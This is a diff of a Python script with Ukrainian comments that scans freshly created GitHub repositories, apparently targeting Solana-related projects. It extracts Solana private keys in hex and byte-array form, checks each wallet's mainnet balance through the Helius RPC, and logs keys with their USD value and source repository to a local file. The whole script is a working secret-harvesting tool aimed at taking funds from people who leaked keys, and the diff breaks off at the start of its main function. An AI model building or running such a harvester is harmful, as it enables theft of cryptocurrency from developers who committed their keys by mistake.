@@ -1,569 +1,327 @@
 # -*- coding: utf-8 -*-
-import aiohttp
-import asyncio
-import re
-import json
-import logging
+import aiohttp, asyncio, re, logging, os
 from urllib.parse import quote
 from dotenv import load_dotenv
-import os
 from datetime import datetime, timedelta, timezone
 from solders.keypair import Keypair
+import aiofiles
 
-# Базовий шлях проекту (Windows)
-BASE_DIR = r"C:\Users\user\Desktop\github scanner"
-LOG_DIR = os.path.normpath(os.path.join(BASE_DIR, "logs"))
-OUTPUT_DIR = os.path.normpath(os.path.join(BASE_DIR, "keys"))
+# Шляхи (Windows)
+BASE = r"C:\Users\user\Desktop\github scanner"
+LOGS = os.path.join(BASE, "logs")
+KEYS_DIR = os.path.join(BASE, "keys")
 
-# Налаштування логування
-repo_logger = logging.getLogger('repo')
-repo_logger.setLevel(logging.INFO)
-repo_handler = logging.FileHandler(os.path.join(LOG_DIR, 'scanner_repos.log'), encoding='utf-8')
+# Логування
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger()
+repo_log = logging.getLogger('repo')
+repo_log.setLevel(logging.INFO)
+repo_handler = logging.FileHandler(os.path.join(LOGS, 'repos.log'), encoding='utf-8')
 repo_handler.setFormatter(logging.Formatter('%(message)s'))
-repo_handler.flush = lambda: repo_handler.stream.flush()  # Примусовий flush
-repo_logger.addHandler(repo_handler)
-
-info_error_logger = logging.getLogger('info_error')
-info_error_logger.setLevel(logging.INFO)
-info_error_handler = logging.FileHandler(os.path.join(LOG_DIR, 'scanner_info_errors.log'), encoding='utf-8')
-info_error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-info_error_handler.flush = lambda: info_error_handler.stream.flush()  # Примусовий flush
-info_error_logger.addHandler(info_error_handler)
-
-# Завантаження змінних із .env
-load_dotenv(os.path.join(BASE_DIR, ".env"))
+repo_log.addHandler(repo_handler)
 
 # Конфігурація
+load_dotenv(os.path.join(BASE, ".env"))
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
-HELIUS_API_KEY = os.getenv("HELIUS_API_KEY")
-
+HELIUS_KEY = os.getenv("HELIUS_API_KEY")
 if not GITHUB_TOKEN:
-    raise ValueError("GITHUB_TOKEN not found in .env file")
-if not HELIUS_API_KEY:
-    info_error_logger.warning("HELIUS_API_KEY not found. Solana balance checking disabled.")
-    print("Warning: HELIUS_API_KEY not found. Solana balance checking disabled.")
-    SOLANA_AVAILABLE = False
-else:
-    SOLANA_AVAILABLE = True
+    raise ValueError("GITHUB_TOKEN missing")
+SOLANA_ON = bool(HELIUS_KEY)
+if not SOLANA_ON:
+    logger.warning("HELIUS_API_KEY missing. Solana balance check disabled.")
 
-# Створення директорій для вихідних файлів і логів
+# Директорії
+os.makedirs(LOGS, exist_ok=True)
+os.makedirs(KEYS_DIR, exist_ok=True)
+SOLANA_FILE = os.path.join(KEYS_DIR, "solana_keys.txt")
 try:
-    os.makedirs(OUTPUT_DIR, exist_ok=True)
-    os.makedirs(LOG_DIR, exist_ok=True)
-    if not os.path.isdir(OUTPUT_DIR):
-        raise OSError(f"Output directory {OUTPUT_DIR} does not exist and could not be created")
-    if not os.path.isdir(LOG_DIR):
-        raise OSError(f"Log directory {LOG_DIR} does not exist and could not be created")
-    info_error_logger.info(f"Created/verified directories: {LOG_DIR}, {OUTPUT_DIR}")
-    print(f"Created/verified directories: {LOG_DIR}, {OUTPUT_DIR}")
+    with open(SOLANA_FILE, "a", encoding="utf-8") as f:
+        f.write("")
 except Exception as e:
-    info_error_logger.error(f"Failed to create directories: {e}")
-    print(f"Error: Failed to create directories: {e}")
+    logger.error(f"Cannot write to {SOLANA_FILE}: {e}")
     raise
 
-OUTPUT_FILES = {
-    "solana": os.path.join(OUTPUT_DIR, "solana_keys.txt")
-}
-
-# Тест запису в solana_keys.txt
-try:
-    with open(OUTPUT_FILES["solana"], "a", encoding="utf-8") as f:
-        f.write("")  # Порожній запис для перевірки
-    info_error_logger.info(f"Successfully verified write access to {OUTPUT_FILES['solana']}")
-    print(f"Successfully verified write access to {OUTPUT_FILES['solana']}")
-except Exception as e:
-    info_error_logger.error(f"Cannot write to {OUTPUT_FILES['solana']}: {e}")
-    print(f"Error: Cannot write to {OUTPUT_FILES['solana']}: {e}")
-    raise
-
-HEADERS = {
-    "Authorization": f"token {GITHUB_TOKEN}",
-    "Accept": "application/vnd.github.v3+json"
-}
+# Константи
+HEADERS = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
 BASE_URL = "https://api.github.com"
-SOLANA_RPC = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_API_KEY}"
-REPO_SCAN_TIMEOUT = 10
-CRYPTO_REQUEST_TIMEOUT = 5
-RECENT_MINUTES = 1  # Початкова 1-хвилинна вікно
-SUB_INTERVAL_SECONDS = 5  # 5-секундні піддіапазони
-MAX_CONCURRENT_SCANS = 5  # Максимум 5 паралельних сканувань
-PAGE_DELAY_SECONDS = 5  # Затримка між сторінками
-TARGET_QUEUE_SIZE = 100  # Цільовий розмір черги
+SOLANA_RPC = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_KEY}"
+TIMEOUTS = {"repo": 10, "crypto": 5, "byte": 2, "write": 10}
+MAX_SCANS = 2
+MAX_FILES = 5
+MAX_REQS = 10
+ERR_PAUSE = 10
+QUEUE_SIZE = 100
+MAX_KEYS = 10
+EXTS = {'.txt', '.py', '.js', '.json', '.md', '.yml', '.yaml', '.ts', '.jsx', '.tsx', '.html', '.css', '.java', '.cpp', '.c', '.h', '.cs', '.go', '.rb', '.php', '.sh', '.bat', '.xml', '.ini', '.conf'}
+TEXT_TYPES = {'text/plain', 'application/json', 'text/x-python', 'application/javascript', 'text/javascript', 'text/x-yaml', 'text/html', 'text/css', 'text/x-markdown', 'text/x-sh', 'application/xml', 'text/xml'}
 
-# Дозволені розширення файлів (текстові формати)
-ALLOWED_EXTENSIONS = {
-    '.txt', '.py', '.js', '.json', '.md', '.yml', '.yaml', '.ts', '.jsx', '.tsx', '.html', '.css',
-    '.java', '.cpp', '.c', '.h', '.cs', '.go', '.rb', '.php', '.sh', '.bat', '.xml', '.ini', '.conf'
-}
+KEYS = set()
+REPOS = set()
+REPO_IDS = set()
+COUNT = 0
+KEY_LOCK = asyncio.Lock()
+REQ_SEM = asyncio.Semaphore(MAX_REQS)
+FILE_SEM = asyncio.Semaphore(MAX_FILES)
+WRITE_SEM = asyncio.Semaphore(1)
 
-# Дозволені Content-Type (текстові MIME-типи)
-TEXT_CONTENT_TYPES = {
-    'text/plain', 'application/json', 'text/x-python', 'application/javascript', 'text/javascript',
-    'text/x-yaml', 'text/html', 'text/css', 'text/x-markdown', 'text/x-sh', 'application/xml',
-    'text/xml'
-}
-
-CRYPTO_PRICES = {
-    "solana": 150.0
-}
-
-FOUND_KEYS = set()
-PROCESSED_REPOS = set()
-SEEN_REPO_IDS = set()
-REPO_COUNT = 0
-FOUND_KEYS_LOCK = asyncio.Lock()  # Лок для синхронізації FOUND_KEYS
-
-# Завантаження оброблених репозиторіїв із scanner_repos.log
-def load_processed_repos():
-    repo_log_path = os.path.join(LOG_DIR, "scanner_repos.log")
+# Оброблені репозиторії
+def load_repos():
+    repo_log_path = os.path.join(LOGS, "repos.log")
     if not os.path.exists(repo_log_path):
-        info_error_logger.info("scanner_repos.log not found, starting with empty PROCESSED_REPOS")
-        print("scanner_repos.log not found, starting with empty PROCESSED_REPOS")
         return
+    cutoff = datetime.now(timezone.utc) - timedelta(days=7)
     try:
-        cutoff_time = datetime.now(timezone.utc) - timedelta(days=7)  # Обмеження на 7 днів
         with open(repo_log_path, "r", encoding="utf-8") as f:
             for line in f:
-                # Формат: "X - YYYY-MM-DD HH:MM:SS - Scanning repo_name (created: ...)"
                 parts = line.strip().split(" - ")
                 if len(parts) >= 3 and parts[2].startswith("Scanning "):
-                    repo_name = parts[2].split(" (")[0].replace("Scanning ", "")
+                    repo = parts[2].split(" (")[0].replace("Scanning ", "")
                     try:
-                        log_time = datetime.strptime(parts[1], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
-                        if log_time >= cutoff_time:
-                            PROCESSED_REPOS.add(repo_name)
+                        if datetime.strptime(parts[1], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc) >= cutoff:
+                            REPOS.add(repo)
                     except ValueError:
                         continue
-        info_error_logger.info(f"Loaded {len(PROCESSED_REPOS)} processed repositories from scanner_repos.log (within last 7 days)")
-        print(f"Loaded {len(PROCESSED_REPOS)} processed repositories from scanner_repos.log (within last 7 days)")
+        logger.info(f"Loaded {len(REPOS)} repos")
     except Exception as e:
-        info_error_logger.error(f"Error loading scanner_repos.log: {e}")
-        print(f"Error loading scanner_repos.log: {e}")
+        logger.error(f"Error loading repos: {e}")
 
-# Виклик функції завантаження при запуску
-load_processed_repos()
+load_repos()
 
 def is_hex_key(data):
-    hex_pattern = r"^[0-9a-fA-F]{64}$"
-    if not bool(re.match(hex_pattern, data)):
-        return False
-    if data == "0000000000000000000000000000000000000000000000000000000000000000":
-        info_error_logger.info(f"Skipping known test key: {data}")
-        print(f"Skipping known test key: {data[:8]}...")
-        return False
-    return True
-
-def is_byte_array_key(data):
-    byte_array_pattern = r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]"
-    if not bool(re.match(byte_array_pattern, data)):
+    if not re.match(r"^[0-9a-fA-F]{64}$", data) or data == "0" * 64:
         return False
     try:
-        cleaned = data.strip("[]").replace(" ", "")
-        bytes_list = [int(x) for x in cleaned.split(",") if x]
-        if len(bytes_list) != 32:
-            return False
-        hex_key = "".join([format(b, "02x") for b in bytes_list])
-        if is_hex_key(hex_key):
-            return hex_key
+        Keypair.from_seed(bytes.fromhex(data)[:32])
+        return True
+    except:
+        return False
+
+async def is_byte_array(data):
+    if not re.match(r"(?:#|//)?\s*\[\s*(?:(?:[0-1]?[0-9]{1,2}|2[0-4][0-9]|25[0-5])(?:\s*,?\s*)){32}\s*\]", data, re.MULTILINE):
+        return False
+    try:
+        async with asyncio.timeout(TIMEOUTS["byte"]):
+            bytes_list = [int(x) for x in data.strip("[]#/\n").replace(" ", "").split(",") if x]
+            if len(bytes_list) != 32 or any(b < 0 or b > 255 for b in bytes_list):
+                return False
+            hex_key = "".join([format(b, "02x") for b in bytes_list])
+            return hex_key if is_hex_key(hex_key) else False
+    except asyncio.TimeoutError:
+        logger.warning(f"Timeout processing byte array: {data[:50]}...")
         return False
     except:
         return False
 
-def private_key_to_sol_address(private_key):
-    if not SOLANA_AVAILABLE:
+def to_sol_address(key):
+    if not SOLANA_ON:
         return None
     try:
-        private_key_bytes = bytes.fromhex(private_key)
-        keypair = Keypair.from_seed(private_key_bytes[:32])
-        return str(keypair.pubkey())
+        return str(Keypair.from_seed(bytes.fromhex(key)[:32]).pubkey())
     except Exception as e:
-        info_error_logger.error(f"Error converting private key to SOL address: {e}")
-        print(f"Error converting private key to SOL address: {e}")
+        logger.error(f"Error converting key: {e}")
         return None
 
-async def get_balance(session, private_key):
-    balances = {}
-    if not SOLANA_AVAILABLE:
-        return balances
-    print(f"Checking Solana balance for key: {private_key[:8]}...")
-    sol_address = private_key_to_sol_address(private_key)
-    if sol_address:
-        try:
-            async with session.post(
-                SOLANA_RPC,
-                json={
-                    "jsonrpc": "2.0",
-                    "id": 1,
-                    "method": "getBalance",
-                    "params": [sol_address]
-                },
-                timeout=CRYPTO_REQUEST_TIMEOUT
-            ) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    balance_lamports = data.get("result", {}).get("value", 0)
-                    balance_sol = balance_lamports / 1_000_000_000
-                    usd_value = balance_sol * CRYPTO_PRICES["solana"]
-                    balances["SOL"] = balance_sol
-                    print(f"Solana balance: {balance_sol:.8f} SOL (${usd_value:.2f})")
-                else:
-                    info_error_logger.warning(f"Failed to check SOL balance for {sol_address}: HTTP {response.status}, Response: {await response.text()}")
-                    print(f"Failed to check SOL balance: HTTP {response.status}")
-        except asyncio.TimeoutError:
-            info_error_logger.warning(f"Timeout checking SOL balance for {sol_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
-            print(f"Timeout checking SOL balance for {sol_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
-        except Exception as e:
-            info_error_logger.error(f"Error checking SOL balance for {sol_address}: {e}")
-            print(f"Error checking SOL balance: {e}")
-    return balances
-
-async def scan_file_content(session, file_url, repo_name):
+async def get_balance(session, key):
+    if not SOLANA_ON:
+        return {}
+    addr = to_sol_address(key)
+    if not addr:
+        return {}
     try:
-        async with session.get(file_url, headers=HEADERS) as response:
-            if response.status != 200:
-                info_error_logger.warning(f"Failed to fetch file {file_url}: HTTP {response.status}")
-                print(f"Warning: Failed to fetch file {file_url}: HTTP {response.status}")
-                return []
-
-            # Перевіряємо Content-Type
-            content_type = response.headers.get('Content-Type', '').split(';')[0].lower()
-            if content_type not in TEXT_CONTENT_TYPES:
-                info_error_logger.info(f"Skipping non-text file {file_url}: Content-Type {content_type}")
-                print(f"Skipping non-text file {file_url}: Content-Type {content_type}")
-                return []
-
-            # Спробуємо отримати вміст як текст
-            content = await response.text()
-    except UnicodeDecodeError as e:
-        info_error_logger.error(f"Failed to decode file {file_url}: {e}")
-        print(f"Error: Failed to decode file {file_url}: {e}")
-        return []
-    except Exception as e:
-        info_error_logger.error(f"Error fetching file {file_url}: {e}")
-        print(f"Error fetching file {file_url}: {e}")
-        return []
-
-    found_keys = []
-
-    # Hex ключі (Solana)
-    hex_candidates = re.findall(r"(?:private_key\s*=\s*|key\s*=\s*|#|//|\s)([0-9a-fA-F]{64})(?:\s|$)", content, re.IGNORECASE)
-    for candidate in hex_candidates:
-        info_error_logger.info(f"Test: Hex candidate: {candidate}")
-        if is_hex_key(candidate):
-            async with FOUND_KEYS_LOCK:
-                if candidate in FOUND_KEYS:
-                    info_error_logger.info(f"Skipping duplicate Hex key in {repo_name}: {candidate}")
-                    print(f"Skipping duplicate Hex key in {repo_name}: {candidate[:8]}...")
-                    continue
-                FOUND_KEYS.add(candidate)
-            print(f"Found Hex key in {repo_name}: {candidate[:8]}...")
-            balances = await get_balance(session, candidate)
-            found_keys.append({
-                "key": candidate,
-                "repo": repo_name,
-                "balances": balances,
-                "type": "hex"
-            })
-            info_error_logger.info(f"Found Hex key in {repo_name}: {candidate} with balances {balances}")
-
-    # Byte array ключі (Solana)
-    byte_array_candidates = re.findall(r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]", content)
-    for candidate in byte_array_candidates:
-        info_error_logger.info(f"Test: Byte array candidate: {candidate}")
-        hex_key = is_byte_array_key(candidate)
-        if hex_key:
-            async with FOUND_KEYS_LOCK:
-                if hex_key in FOUND_KEYS:
-                    info_error_logger.info(f"Skipping duplicate byte array key in {repo_name}: {candidate} (hex: {hex_key})")
-                    print(f"Skipping duplicate byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
-                    continue
-                FOUND_KEYS.add(hex_key)
-            print(f"Found byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
-            balances = await get_balance(session, hex_key)
-            found_keys.append({
-                "key": hex_key,
-                "repo": repo_name,
-                "balances": balances,
-                "type": "byte_array"
-            })
-            info_error_logger.info(f"Found byte array key in {repo_name}: {candidate} (hex: {hex_key}) with balances {balances}")
-
-    return found_keys
-
-async def scan_repository(session, repo):
-    global REPO_COUNT
-    repo_name = repo["full_name"]
-    async with FOUND_KEYS_LOCK:
-        if repo_name in PROCESSED_REPOS:
-            info_error_logger.info(f"Skipping already processed repository: {repo_name}")
-            print(f"Skipping already processed repository: {repo_name}")
-            return []
-        PROCESSED_REPOS.add(repo_name)
-
-    REPO_COUNT += 1
-    created_at = repo.get("created_at", "N/A")
-    repo_logger.info(f"{REPO_COUNT} - {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} - Scanning {repo_name} (created: {created_at})")
-    print(f"Scanning {repo_name} (created: {created_at})")
-
-    contents_url = f"{BASE_URL}/repos/{repo_name}/contents"
-    try:
-        async with session.get(contents_url, headers=HEADERS, timeout=REPO_SCAN_TIMEOUT) as response:
-            if response.status != 200:
-                info_error_logger.warning(f"Failed to fetch contents for {repo_name}: HTTP {response.status}")
-                print(f"Warning: Failed to fetch contents for {repo_name}: HTTP {response.status}")
-                return []
-            contents = await response.json()
+        async with REQ_SEM, session.post(SOLANA_RPC, json={"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [addr]}, timeout=TIMEOUTS["crypto"]) as resp:
+            if resp.status != 200:
+                logger.warning(f"Solana balance check failed for {addr}: HTTP {resp.status}")
+                return {}
+            data = await resp.json()
+            sol = data.get("result", {}).get("value", 0) / 1_000_000_000
+            return {"SOL": sol}
     except asyncio.TimeoutError:
-        info_error_logger.warning(f"Timeout fetching contents for {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
-        print(f"Timeout fetching contents for {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
-        return []
+        logger.warning(f"Timeout checking balance for {addr}")
+        return {}
     except Exception as e:
-        info_error_logger.error(f"Error fetching contents for {repo_name}: {e}")
-        print(f"Error fetching contents for {repo_name}: {e}")
+        logger.error(f"Balance check error: {e}")
+        return {}
+
+async def scan_file(session, url, repo, pos, total):
+    try:
+        async with FILE_SEM, REQ_SEM, session.get(url, headers=HEADERS) as resp:
+            if resp.status != 200:
+                logger.warning(f"File fetch failed {url}: HTTP {resp.status}")
+                return []
+            if resp.headers.get('Content-Type', '').split(';')[0].lower() not in TEXT_TYPES:
+                return []
+            content = await resp.text()
+    except Exception as e:
+        logger.error(f"Error fetching file {url}: {e}")
         return []
 
-    found_keys = []
-    tasks = []
-    for item in contents:
-        if item["type"] == "file" and not item["name"].lower() == "readme.md":
-            file_name = item["name"]
-            file_ext = os.path.splitext(file_name)[1].lower()
-            if file_ext not in ALLOWED_EXTENSIONS:
-                info_error_logger.info(f"Skipping file {file_name} in {repo_name}: unsupported extension {file_ext}")
-                print(f"Skipping file {file_name} in {repo_name}: unsupported extension {file_ext}")
-                continue
-            file_url = item["download_url"]
-            if file_url:
-                tasks.append(scan_file_content(session, file_url, repo_name))
+    keys = []
+    # Hex ключі
+    for candidate in re.findall(r"(?:private_key\s*=\s*|key\s*=\s*|#|//|\s)([0-9a-fA-F]{64})(?:\s|$)", content, re.IGNORECASE):
+        if is_hex_key(candidate):
+            async with KEY_LOCK:
+                if candidate in KEYS:
+                    continue
+                KEYS.add(candidate)
+            logger.info(f"Found key in {repo} ({pos}/{total}): {candidate[:8]}...")
+            balances = await get_balance(session, candidate)
+            keys.append({"key": candidate, "repo": repo, "balances": balances, "type": "hex"})
 
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for result in results:
+    # Byte array ключі
+    for candidate in re.findall(r"(?:#|//)?\s*\[\s*(?:(?:[0-1]?[0-9]{1,2}|2[0-4][0-9]|25[0-5])(?:\s*,?\s*)){32}\s*\]", content, re.MULTILINE):
+        if hex_key := await is_byte_array(candidate):
+            async with KEY_LOCK:
+                if hex_key in KEYS:
+                    continue
+                KEYS.add(hex_key)
+            logger.info(f"Found byte array key in {repo} ({pos}/{total}): {hex_key[:8]}...")
+            balances = await get_balance(session, hex_key)
+            keys.append({"key": hex_key, "repo": repo, "balances": balances, "type": "byte_array"})
+
+    return keys
+
+async def scan_repo(session, repo, pos, total):
+    global COUNT
+    name = repo["full_name"]
+    async with KEY_LOCK:
+        if name in REPOS:
+            return []
+        REPOS.add(name)
+
+    COUNT += 1
+    created = repo.get("created_at", "N/A")
+    repo_log.info(f"{COUNT} - {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} - Scanning {name} ({pos}/{total})")
+    logger.info(f"Scanning {name} ({pos}/{total})")
+
+    try:
+        async with REQ_SEM, session.get(f"{BASE_URL}/repos/{name}/contents", headers=HEADERS, timeout=TIMEOUTS["repo"]) as resp:
+            if resp.status != 200:
+                logger.warning(f"Contents fetch failed for {name}: HTTP {resp.status}")
+                return []
+            contents = await resp.json()
+    except:
+        logger.warning(f"Error fetching contents for {name}")
+        return []
+
+    tasks = [asyncio.create_task(scan_file(session, item["download_url"], name, pos, total))
+             for item in contents
+             if item["type"] == "file" and item["name"].lower() != "readme.md" and os.path.splitext(item["name"])[1].lower() in EXTS and item.get("download_url")]
+    
+    keys = []
+    for result in await asyncio.gather(*tasks, return_exceptions=True):
         if isinstance(result, list):
-            found_keys.extend(result)
-
-    return found_keys
+            keys.extend(result)
+    
+    return keys[:MAX_KEYS]
 
 async def save_keys(keys):
     if not keys:
         return
-    saved_count = 0
-    for key_info in keys:
-        key = key_info["key"]
-        repo = key_info["repo"]
-        balances = key_info["balances"]
-        key_type = key_info["type"]
+    lines = [f"{k['key']} | SOL: {k['balances'].get('SOL', 0):.8f} (${k['balances'].get('SOL', 0) * 150:.2f} USD) | Type: {k['type']} | Repo: {k['repo']}\n"
+             if k["balances"].get("SOL") else f"{k['key']} | N/A | Type: {k['type']} | Repo: {k['repo']}\n"
+             for k in keys]
+    try:
+        async with WRITE_SEM, asyncio.timeout(TIMEOUTS["write"]), aiofiles.open(SOLANA_FILE, "a", encoding="utf-8") as f:
+            await f.writelines(lines)
+            await f.flush()
+        logger.info(f"Saved {len(keys)} keys to {SOLANA_FILE}")
+    except asyncio.TimeoutError:
+        logger.error(f"Timeout saving keys: exceeded {TIMEOUTS['write']}s")
+    except Exception as e:
+        logger.error(f"Failed to save keys: {e}")
 
-        async with FOUND_KEYS_LOCK:
-            if key not in FOUND_KEYS:
-                info_error_logger.warning(f"Attempted to save non-registered key {key[:8]}... from {repo}")
-                print(f"Warning: Attempted to save non-registered key {key[:8]}... from {repo}")
-                continue
-
-        # Solana (hex, byte_array)
-        balance = balances.get("SOL", 0)
-        balance_str = f"SOL: {balance:.8f} (${balance * CRYPTO_PRICES['solana']:.2f} USD)" if "SOL" in balances else "SOL: N/A"
-        try:
-            with open(OUTPUT_FILES["solana"], "a", encoding="utf-8") as f:
-                f.write(f"{key} | {balance_str} | Type: {key_type} | Repo: {repo}\n")
-                f.flush()  # Примусовий flush
-            info_error_logger.info(f"Saved SOL key to {OUTPUT_FILES['solana']}: {key[:8]}... with balance {balance_str}")
-            print(f"Saved SOL key to {OUTPUT_FILES['solana']}: {key[:8]}... with balance {balance_str}")
-            saved_count += 1
-        except Exception as e:
-            info_error_logger.error(f"Failed to save SOL key to {OUTPUT_FILES['solana']}: {e}")
-            print(f"Error: Failed to save SOL key to {OUTPUT_FILES['solana']}: {e}")
-            continue
-
-    if saved_count > 0:
-        print(f"Saved {saved_count} keys to {OUTPUT_FILES['solana']}")
-    else:
-        print("No new keys saved")
-
-async def fetch_repos_to_queue(session, repo_queue, start_time, end_time):
-    start_time_str = start_time.strftime("%Y-%m-%dT%H:%M:%SZ")
-    end_time_str = end_time.strftime("%Y-%m-%dT%H:%M:%SZ")
-    search_query = f"created:{start_time_str}..{end_time_str}"
-    encoded_query = quote(search_query)
-    info_error_logger.info(f"Query: {search_query}")
-    print(f"Query: {search_query}")
-    if len(encoded_query) > 256:
-        info_error_logger.error(f"Query too long: {len(encoded_query)} characters")
-        print(f"Error: Query too long: {len(encoded_query)} characters")
-        return
-    search_url = f"{BASE_URL}/search/repositories?q={encoded_query}&sort=created&order=desc"
-    print(f"Fetching repositories with query: {search_query}...")
-    info_error_logger.info(f"Fetching repositories with query: {search_query}...")
+async def fetch_repos(session, queue, start):
+    query = f"sol OR solana OR pumpfun OR phantom created:{start.strftime('%Y-%m-%d')}"
+    logger.info(f"Query: {query}")
+    url = f"{BASE_URL}/search/repositories?q={quote(query)}&sort=created&order=desc"
     page = 1
-    while repo_queue.qsize() < TARGET_QUEUE_SIZE:
+    while queue.qsize() < QUEUE_SIZE:
         try:
-            async with session.get(f"{search_url}&page={page}&per_page=100", headers=HEADERS) as response:
-                if response.status == 403 and "rate limit exceeded" in (await response.text()).lower():
-                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
-                    if reset_time:
-                        wait_seconds = max(60, reset_time - int(datetime.now(timezone.utc).timestamp()) + 5)
-                        info_error_logger.warning(f"API rate limit exceeded, waiting {wait_seconds} seconds until reset")
-                        print(f"API rate limit exceeded, waiting {wait_seconds} seconds until reset...")
-                        await asyncio.sleep(wait_seconds)
-                    else:
-                        info_error_logger.warning("API rate limit exceeded, pausing for 60 seconds")
-                        print("API rate limit exceeded, pausing for 60 seconds...")
-                        await asyncio.sleep(60)
+            async with REQ_SEM, session.get(f"{url}&page={page}&per_page=100", headers=HEADERS) as resp:
+                if resp.status == 403 and "rate limit" in (await resp.text()).lower():
+                    wait = max(60, int(resp.headers.get("X-RateLimit-Reset", 0)) - int(datetime.now(timezone.utc).timestamp()) + 5)
+                    logger.warning(f"Rate limit hit, waiting {wait}s")
+                    await asyncio.sleep(wait)
                     continue
-                if response.status != 200:
-                    error_text = await response.text()
-                    info_error_logger.error(f"Error fetching repositories: HTTP {response.status}, Response: {error_text}")
-                    print(f"Error fetching repositories: HTTP {response.status}, Response: {error_text}")
+                if resp.status != 200:
+                    logger.error(f"Repo fetch failed: HTTP {resp.status}")
                     break
-                remaining = response.headers.get("X-RateLimit-Remaining", "unknown")
-                info_error_logger.info(f"API requests remaining: {remaining}")
-                print(f"API requests remaining: {remaining}")
-                if remaining != "unknown" and int(remaining) < 10:
-                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
-                    if reset_time:
-                        wait_seconds = max(60, reset_time - int(datetime.now(timezone.utc).timestamp()) + 5)
-                        info_error_logger.warning(f"Low API rate limit ({remaining}), waiting {wait_seconds} seconds until reset")
-                        print(f"Low API rate limit ({remaining}), waiting {wait_seconds} seconds until reset...")
-                        await asyncio.sleep(wait_seconds)
-                    else:
-                        info_error_logger.warning("Low API rate limit, pausing for 60 seconds")
-                        print("Low API rate limit, pausing for 60 seconds...")
-                        await asyncio.sleep(60)
-                data = await response.json()
-                total_count = data.get("total_count", 0)
-                page_repos = data.get("items", [])
-                info_error_logger.info(f"Page {page}: total_count={total_count}, repos={len(page_repos)}")
-                print(f"Page {page}: total_count={total_count}, repos={len(page_repos)}")
-                if total_count > 1000:
-                    info_error_logger.warning(f"Search results exceed 1000 ({total_count}), processing current page")
-                    print(f"Warning: Search results exceed 1000 ({total_count}), processing current page")
-                    info_error_logger.info(f"API response: {json.dumps(data, indent=2)}")
-                if not page_repos:
-                    info_error_logger.info(f"No more repositories on page {page}, stopping pagination")
-                    print(f"No more repositories on page {page}, stopping pagination")
+                remaining = resp.headers.get("X-RateLimit-Remaining", "unknown")
+                if remaining != "unknown" and int(remaining) < 5:
+                    wait = max(60, int(resp.headers.get("X-RateLimit-Reset", 0)) - int(datetime.now(timezone.utc).timestamp()) + 5)
+                    logger.warning(f"Low rate limit ({remaining}), waiting {wait}s")
+                    await asyncio.sleep(wait)
+                data = await resp.json()
+                repos = data.get("items", [])
+                logger.info(f"Found {data.get('total_count', 0)} repos for query: {query}")
+                if not repos:
                     break
-
-                filtered_repos = []
-                async with FOUND_KEYS_LOCK:
-                    for repo in page_repos:
-                        repo_id = repo["id"]
-                        repo_name = repo["full_name"]
-                        if repo_id not in SEEN_REPO_IDS and repo_name not in PROCESSED_REPOS:
-                            SEEN_REPO_IDS.add(repo_id)
-                            filtered_repos.append(repo)
-                            await repo_queue.put(repo)
-                            created_at = repo.get("created_at", "N/A")
-                            info_error_logger.info(f"Queued repo: {repo_name}, created_at: {created_at}")
-                            print(f"Queued repo: {repo_name}, created_at: {created_at}")
-                        else:
-                            info_error_logger.info(f"Skipped repo: {repo_name} (already in SEEN_REPO_IDS or PROCESSED_REPOS)")
-                            print(f"Skipped repo: {repo_name} (already in SEEN_REPO_IDS or PROCESSED_REPOS)")
-
-                info_error_logger.info(f"Queued {len(filtered_repos)} repositories from page {page}, total queued: {repo_queue.qsize()}")
-                print(f"Queued {len(filtered_repos)} repositories from page {page}, total queued: {repo_queue.qsize()}")
-
+                async with KEY_LOCK:
+                    for repo in repos:
+                        if repo["id"] not in REPO_IDS and repo["full_name"] not in REPOS:
+                            REPO_IDS.add(repo["id"])
+                            await queue.put(repo)
+                            logger.info(f"Queued {repo['full_name']} ({queue.qsize()}/{QUEUE_SIZE})")
         except Exception as e:
-            info_error_logger.error(f"Error fetching repositories on page {page}: {e}")
-            print(f"Error fetching repositories on page {page}: {e}")
+            logger.error(f"Error fetching page {page}: {e}")
             break
         page += 1
-        if page_repos:
-            await asyncio.sleep(PAGE_DELAY_SECONDS)
 
-async def process_queue(session, repo_queue):
+async def process_queue(session, queue):
+    pos = 0
+    total = queue.qsize()
     tasks = []
-    while not repo_queue.empty():
-        repo = await repo_queue.get()
-        tasks.append(asyncio.create_task(scan_repository(session, repo)))
-        if len(tasks) >= MAX_CONCURRENT_SCANS:
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            for result in results:
+    while not queue.empty():
+        pos += 1
+        repo = await queue.get()
+        tasks.append(asyncio.create_task(scan_repo(session, repo, pos, total)))
+        if len(tasks) >= MAX_SCANS:
+            for result in await asyncio.gather(*tasks, return_exceptions=True):
                 if isinstance(result, list) and result:
                     await save_keys(result)
             tasks = []
-        repo_queue.task_done()
+        queue.task_done()
     if tasks:
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        for result in results:
+        for result in await asyncio.gather(*tasks, return_exceptions=True):
             if isinstance(result, list) and result:
                 await save_keys(result)
-        for task in tasks:
-            repo_queue.task_done()
+        for _ in tasks:
+            queue.task_done()
+    if not tasks and queue.empty():
+        logger.info("Queue exhausted, starting next cycle")
 
 async def main():
     async with aiohttp.ClientSession() as session:
-        cycle_count = 0
